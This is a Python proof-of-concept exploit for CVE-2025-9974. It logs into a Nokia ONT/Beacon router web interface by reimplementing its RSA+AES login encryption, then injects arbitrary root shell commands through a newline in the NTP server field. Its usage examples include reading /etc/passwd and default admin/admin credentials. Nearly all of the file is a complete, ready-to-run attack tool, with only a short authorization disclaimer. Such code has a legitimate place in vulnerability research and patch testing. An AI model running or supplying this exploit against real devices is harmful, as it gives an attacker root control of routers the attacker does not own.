#!/usr/bin/env python3
"""
CVE-2025-9974 — Nokia ONT/Beacon WebUI Authenticated Command Injection

Exploits insufficient shell metacharacter filtering in the NTP settings
endpoint (sntp_web_app.cgi?post_glb).  A newline in the ntpServerOther1
field bypasses the blacklist and executes an additional command under
/bin/sh -c with root privileges.

Login flow (reverse-engineered from the WebUI JS bundles in this repo):
  1. POST login_web_app.cgi?nonce          → nonce + RSA pubkey + randomKey
  2. GET  dashboard_device_status_web_app  → device sync (matches WebUI flow)
  3. POST login_web_app.cgi                → session cookie + CSRF token
  4. POST sntp_web_app.cgi?post_glb        → inject command via ntpServerOther1

The payload encryption (RSA+AES hybrid) is reimplemented from crypto_page
in scripts.js.  The login body uses the hashFlag==0 / non-FWA path where
the password is URL-encoded plaintext inside the encrypted envelope.

Authorization: For security testing of devices you own or are authorized
to test only.  Research basis: firmware 3FE49996HJLL91 (1.2404.491).
Your firmware may differ — see --debug to inspect protocol details.
"""

import argparse
import base64
import json
import os
import sys
from datetime import datetime
from urllib.parse import quote_plus, parse_qs

try:
    import requests
    import urllib3
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
except ImportError:
    sys.exit("Missing dependencies:\n  pip install requests pycryptodome urllib3")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class NokiaBeaconExploit:
    """Minimal WebUI client + CVE-2025-9974 injection for Nokia Beacon/ONT."""

    def __init__(self, host, username="admin", password="admin",
                 use_https=True, verify_tls=False, debug=False):
        scheme = "https" if use_https else "http"
        self.base_url = f"{scheme}://{host}"
        self.username = username
        self.password = password
        self.debug = debug

        self.session = requests.Session()
        self.session.verify = verify_tls
        self.session.cookies.set("lang", "en")
        self.session.headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json, text/plain, */*",
            "Origin": self.base_url,
        })

        # State retrieved from the device
        self.pubkey_pem = None
        self.nonce = None
        self.random_key = None
        self.csrf_token = None
        self.sid = None

        # Client-generated AES key/IV — sent in the login body so the
        # server can encrypt subsequent responses (aes_decrypt in scripts.js)
        self.dec_key = os.urandom(16)
        self.dec_iv = os.urandom(16)

    # ── crypto helpers (matching crypto_page in scripts.js) ────────────

    @staticmethod
    def _b64url_nopad(data: bytes) -> str:
        """sjcl.codec.base64url.fromBits — base64url, '=' stripped."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def _ck_escape(data: bytes) -> str:
        """crypto_page.e() — + → -  / → _  = → .  (for RSA ciphertext 'ck')."""
        s = base64.urlsafe_b64encode(data).decode()
        return s.replace("+", "-").replace("/", "_").replace("=", ".")

    @staticmethod
    def _str_escape(s: str) -> str:
        """crypto_page.base64url_escape() on a string: + → -  / → _  = → ."""
        return s.replace("+", "-").replace("/", "_").replace("=", ".")

    def _encrypt_post(self, plaintext: str) -> str:
        """
        crypto_page.encrypt_post_data(pubkey, plaintext)
        → "encrypted=1&ct=<b64url>&ck=<custom_b64url>"

        Hybrid: random AES-128-CBC key/IV encrypt the plaintext; RSA-PKCS1v1.5
        encrypts the base64(key)+space+base64(iv).  Zero-padding matches SJCL.
        """
        aes_key = os.urandom(16)
        aes_iv = os.urandom(16)

        # SJCL's CBC mode zero-pads the bitArray to a 16-byte boundary.
        # Unlike PKCS#7, no extra block is added when already aligned.
        pt = plaintext.encode("utf-8")
        pad_len = (16 - len(pt) % 16) % 16
        pt_padded = pt + b"\x00" * pad_len

        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        ct_bytes = cipher.encrypt(pt_padded)

        # RSA-encrypt "base64(key) base64(iv)"  (space-separated, standard b64)
        key_b64 = base64.b64encode(aes_key).decode()
        iv_b64 = base64.b64encode(aes_iv).decode()
        combined = f"{key_b64} {iv_b64}"

        rsa_key = RSA.import_key(self.pubkey_pem)
        rsa_ct = PKCS1_v1_5.new(rsa_key).encrypt(combined.encode())

        ct = self._b64url_nopad(ct_bytes)
        ck = self._ck_escape(rsa_ct)
        body = f"encrypted=1&ct={ct}&ck={ck}"

        if self.debug:
            print(f"    [plaintext ] {plaintext[:300]}")
            print(f"    [encrypted ] {body[:160]}...")
        return body

    def _maybe_decrypt_response(self, text: str) -> str:
        """Best-effort AES-CBC decryption of server responses (aes_decrypt)."""
        if not text or len(text) < 32:
            return text
        raw = text.strip().strip('"')
        try:
            # base64url decode
            padded = raw + "=" * (4 - len(raw) % 4) if len(raw) % 4 else raw
            ct = base64.urlsafe_b64decode(padded)
            if len(ct) == 0 or len(ct) % 16 != 0:
                return text
            cipher = AES.new(self.dec_key, AES.MODE_CBC, self.dec_iv)
            pt = cipher.decrypt(ct)
            return pt.rstrip(b"\x00").decode("utf-8", errors="replace")
        except Exception:
            return text

    # ── response parsing ───────────────────────────────────────────────

    @staticmethod
    def _parse(resp):
        """Parse response body as JSON, then URL-encoded form data."""
        text = resp.text.strip()
        # JSON
        try:
            obj = json.loads(text)
            if isinstance(obj, dict):
                return obj
        except (json.JSONDecodeError, ValueError):
            pass
        # URL-encoded key=value pairs
        if "=" in text:
            parsed = parse_qs(text, keep_blank_values=True)
            if parsed:
                return {k: v[-1] for k, v in parsed.items()}
        return {"raw": text}

    # ── protocol steps ─────────────────────────────────────────────────

    def step1_get_nonce(self):
        """POST login_web_app.cgi?nonce → retrieve nonce + RSA pubkey + randomKey."""
        url = f"{self.base_url}/login_web_app.cgi?nonce"
        body = f"userName={self.username}"

        print(f"  → POST {url}")
        resp = self.session.post(url, data=body)
        print(f"  ← HTTP {resp.status_code}")

        data = self._parse(resp)

        self.nonce = data.get("nonce", "")
        self.pubkey_pem = data.get("pubkey", data.get("PublicKey", ""))
        self.random_key = data.get("randomKey", data.get("random_key", ""))

        if not self.pubkey_pem:
            raise RuntimeError(
                f"No pubkey in nonce response.\n"
                f"  Body: {resp.text[:400]}"
            )

        # Normalize to PEM if the server returned raw base64
        pk = self.pubkey_pem.strip()
        if "BEGIN" not in pk:
            # Add line breaks every 64 chars for PEM compliance
            pk_lines = [pk[i:i + 64] for i in range(0, len(pk), 64)]
            self.pubkey_pem = (
                "-----BEGIN PUBLIC KEY-----\n"
                + "\n".join(pk_lines)
                + "\n-----END PUBLIC KEY-----"
            )

        print(f"  nonce     = {self.nonce[:48]}{'…' if len(self.nonce) > 48 else ''}")
        print(f"  pubkey    = {'PEM' if 'BEGIN' in self.pubkey_pem else 'raw'} "
              f"({len(self.pubkey_pem)} chars)")
        print(f"  randomKey = {self.random_key[:48]}{'…' if len(self.random_key) > 48 else ''}")
        return data

    def step1b_get_router_info(self):
        """GET dashboard_device_status_web_app.cgi — device sync (WebUI does this
        between nonce and login; included for protocol fidelity)."""
        url = f"{self.base_url}/dashboard_device_status_web_app.cgi"
        if self.debug:
            print(f"  → GET {url}")
        resp = self.session.get(url, headers={"Referer": f"{self.base_url}/"})
        if self.debug:
            print(f"  ← HTTP {resp.status_code} ({len(resp.text)} bytes)")
        return resp

    def step2_login(self):
        """POST login_web_app.cgi → authenticate, obtain session + CSRF token.

        Body (before encryption, hashFlag==0 / non-FWA path):
          userhash=<username>
          &RandomKeyhash=<randomKey from nonce>
          &response=<urlencode(password)>
          &nonce=<base64url_escaped(nonce)>
          &enckey=<base64url_escaped(b64(dec_key))>
          &enciv=<base64url_escaped(b64(dec_iv))>
          &nohash=1
          &hPassword=undefined
        """
        enckey = self._str_escape(base64.b64encode(self.dec_key).decode())
        enciv = self._str_escape(base64.b64encode(self.dec_iv).decode())
        nonce_esc = self._str_escape(self.nonce)

        plaintext = (
            f"userhash={self.username}"
            f"&RandomKeyhash={self.random_key}"
            f"&response={quote_plus(self.password)}"
            f"&nonce={nonce_esc}"
            f"&enckey={enckey}"
            f"&enciv={enciv}"
            f"&nohash=1"
            f"&hPassword=undefined"
        )

        body = self._encrypt_post(plaintext)

        url = f"{self.base_url}/login_web_app.cgi"
        print(f"  → POST {url}")
        resp = self.session.post(url, data=body)
        print(f"  ← HTTP {resp.status_code}")

        data = self._parse(resp)

        # Try decrypting the response if it looks encrypted
        if "raw" in data:
            decrypted = self._maybe_decrypt_response(data["raw"])
            if decrypted != data["raw"]:
                data = self._parse(type(resp)())  # parse decrypted
                # Re-parse decrypted text
                try:
                    data = json.loads(decrypted)
                except Exception:
                    parsed = parse_qs(decrypted, keep_blank_values=True)
                    data = {k: v[-1] for k, v in parsed.items()} if parsed else {"raw": decrypted}

        self.csrf_token = data.get("token", data.get("csrf_token", ""))
        self.sid = data.get("sid", data.get("SID", ""))

        # Fall back to cookies
        if not self.sid:
            self.sid = self.session.cookies.get("sid", "")
        if not self.csrf_token:
            self.csrf_token = self.session.cookies.get("token", "")

        if not self.csrf_token:
            raise RuntimeError(
                f"No CSRF token in login response.\n"
                f"  Body: {resp.text[:400]}\n"
                f"  Cookies: {dict(self.session.cookies)}"
            )

        print(f"  token = {self.csrf_token}")
        print(f"  sid   = {self.sid}")
        return data

    def step3_inject_ntp(self, command):
        """POST sntp_web_app.cgi?post_glb → inject command via ntpServerOther1.

        The plaintext body (before encryption) is:
          time=<urlencoded datetime>
          &ntpServer1=&ntpServerOther1=<INJECTION>
          &ntpServer2=&ntpServerOther2=
          &ntpServer3=&ntpServerOther3=
          &interval=3600&timezone=<urlencoded>&ntpEnabled=on
          &csrf_token=<token>

        The framework (postWithCSRFToken) appends csrf_token and then encrypts.
        The newline in ntpServerOther1 bypasses the shell metachar blacklist.
        """
        now = datetime.now().strftime("%m/%d/%Y %I:%M:%S %p")

        # Injection: a valid NTP hostname, then a newline, then the command.
        # URL-encoding turns \n into %0A; the server URL-decodes it back to \n
        # before concatenating into the shell command string.
        injection = f"pool.ntp.org\n{command}"

        plaintext = (
            f"time={quote_plus(now)}"
            f"&ntpServer1="
            f"&ntpServerOther1={quote_plus(injection)}"
            f"&ntpServer2="
            f"&ntpServerOther2="
            f"&ntpServer3="
            f"&ntpServerOther3="
            f"&interval=3600"
            f"&timezone={quote_plus('+00:0 UTC')}"
            f"&ntpEnabled=on"
            f"&csrf_token={self.csrf_token}"
        )

        body = self._encrypt_post(plaintext)

        url = f"{self.base_url}/sntp_web_app.cgi?post_glb"
        print(f"  → POST {url}")
        resp = self.session.post(url, data=body, headers={
            "Referer": f"{self.base_url}/",
        })
        print(f"  ← HTTP {resp.status_code}")
        return resp

    def verify_file(self, path):
        """GET command_web_app.cgi?cat+<path> → read a file (admin endpoint).

        Listed as accessible in admin-accessible-endpoints.md.  Useful for
        verifying command execution by writing output to a file first.
        """
        url = f"{self.base_url}/command_web_app.cgi?cat+{path}"
        print(f"  → GET {url}")
        resp = self.session.get(url, headers={"Referer": f"{self.base_url}/"})
        print(f"  ← HTTP {resp.status_code}")
        return resp.text

    # ── full chain ─────────────────────────────────────────────────────

    def run(self, command, verify_path=None):
        print(f"\n[*] Target : {self.base_url}")
        print(f"[*] User   : {self.username}")
        if self.debug:
            print(f"[*] decKey : {self.dec_key.hex()}")
            print(f"[*] decIV  : {self.dec_iv.hex()}")

        print("\n[*] Step 1 — Retrieve nonce + RSA public key")
        self.step1_get_nonce()

        print("\n[*] Step 1b — Device sync (dashboard status)")
        self.step1b_get_router_info()

        print("\n[*] Step 2 — Authenticate")
        self.step2_login()

        print(f"\n[*] Step 3 — Inject command: {command!r}")
        resp = self.step3_inject_ntp(command)

        # Show response (try decrypt)
        raw = resp.text.strip()
        decrypted = self._maybe_decrypt_response(raw)
        if decrypted != raw:
            print(f"  [decrypted] {decrypted[:300]}")
        else:
            print(f"  [response ] {raw[:300]}")

        if verify_path:
            print(f"\n[*] Step 4 — Verify: read {verify_path}")
            content = self.verify_file(verify_path)
            print(f"\n{'─' * 40} {verify_path} {'─' * 40}")
            print(content)
            print(f"{'─' * 40} end {'─' * 44}")

        return resp


def main():
    parser = argparse.ArgumentParser(
        description=(
            "CVE-2025-9974 — Nokia ONT/Beacon WebUI Command Injection PoC\n\n"
            "Authenticated command injection via the NTP settings endpoint.\n"
            "A newline in ntpServerOther1 bypasses the shell metacharacter\n"
            "blacklist, executing an additional command under /bin/sh -c."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Authorization: For security testing of devices you own/control only.\n"
            "Research basis: firmware 3FE49996HJLL91 (1.2404.491).\n"
            "Dependencies: pip install requests pycryptodome\n\n"
            "Examples:\n"
            "  %(prog)s -H 192.168.18.1 -u admin -p admin --cmd \"id\"\n"
            "  %(prog)s -H 192.168.18.1 --cmd \"id > /tmp/pwned\" --verify /tmp/pwned\n"
            "  %(prog)s -H 192.168.18.1 --cmd \"cat /etc/passwd\" --debug\n"
            "  %(prog)s -H 192.168.18.1 --http --cmd \"uname -a\""
        ),
    )
    parser.add_argument("-H", "--host", required=True,
                        help="Device IP or hostname")
    parser.add_argument("-u", "--username", default="admin",
                        help="WebUI username (default: admin)")
    parser.add_argument("-p", "--password", default="admin",
                        help="WebUI password (default: admin)")
    parser.add_argument("--cmd", default="id",
                        help="Shell command to inject (default: id)")
    parser.add_argument("--verify", metavar="PATH",
                        help="After injection, read this file via "
                             "command_web_app.cgi?cat+ to verify execution")
    parser.add_argument("--http", action="store_true",
                        help="Use HTTP instead of HTTPS")
    parser.add_argument("--debug", action="store_true",
                        help="Print plaintext bodies before encryption")
    args = parser.parse_args()

    client = NokiaBeaconExploit(
        host=args.host,
        username=args.username,
        password=args.password,
        use_https=not args.http,
        debug=args.debug,
    )

    try:
        client.run(command=args.cmd, verify_path=args.verify)
    except requests.exceptions.ConnectionError as e:
        print(f"\n[-] Connection failed: {e}")
        sys.exit(1)
    except RuntimeError as e:
        print(f"\n[-] Protocol error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
